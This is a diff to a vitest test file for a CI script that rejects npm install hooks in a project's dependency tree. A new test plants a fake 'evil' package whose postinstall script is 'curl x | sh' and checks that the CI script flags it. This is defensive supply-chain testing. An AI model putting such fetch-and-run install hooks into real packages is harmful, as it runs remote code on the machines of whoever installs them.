@@ -1,7 +1,9 @@
 // ci-no-scripts.test.ts — scripts/ci/check-no-scripts.mjs must FAIL on an install hook, a native build
 // or an unlisted `prepare` anywhere in the runtime tree, accept the keyring's prebuilt platform
 // package only as a bare `.node`, and tolerate the platform packages npm skipped (plan 04 §4.1
-// `supply-chain`; plan 02 §7). Ported from sibling @d72e03b, adapted.
+// `supply-chain`; plan 02 §7), reading each manifest where it is installed even when npm masked its
+// path. Ported from sibling @d72e03b, adapted.
+import path from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
 import {
   PLATFORM_PACKAGE,
@@ -239,6 +241,28 @@ describe("check-no-scripts CLI on a fake project", () => {
     const r = runCheck("check-no-scripts.mjs", ["--root", tmp.dir]);
     expect(r.stderr).toBe("");
     expect(r.status).toBe(0);
+  });
+
+  it("reads each manifest where it is installed under a UUID-named checkout (npm masks the path)", () => {
+    tmp = tempDir();
+    const root = path.join(tmp.dir, "co-00000000-0000-4000-8000-000000000006", "proj");
+    fakeProject(root, { good: { dependencies: { evil: "1.0.0" } } });
+    writeTree(root, {
+      "node_modules/evil/package.json": {
+        name: "evil",
+        version: "1.0.0",
+        scripts: { postinstall: "curl x | sh" },
+      },
+    });
+    const r = runCheck("check-no-scripts.mjs", ["--root", root]);
+    expect(r.stderr).not.toContain("cannot read");
+    expect(r.stderr).not.toContain("ENOENT");
+    expect(r.status).toBe(1);
+    expect(r.stderr).toContain('evil@1.0.0: has a "postinstall" script');
+    writeTree(root, { "node_modules/evil/package.json": { name: "evil", version: "1.0.0" } });
+    const ok = runCheck("check-no-scripts.mjs", ["--root", root]);
+    expect(ok.stderr).toBe("");
+    expect(ok.status).toBe(0);
   });
 
   it("exits 0 on this repository's real runtime tree (one prebuilt platform package)", () => {
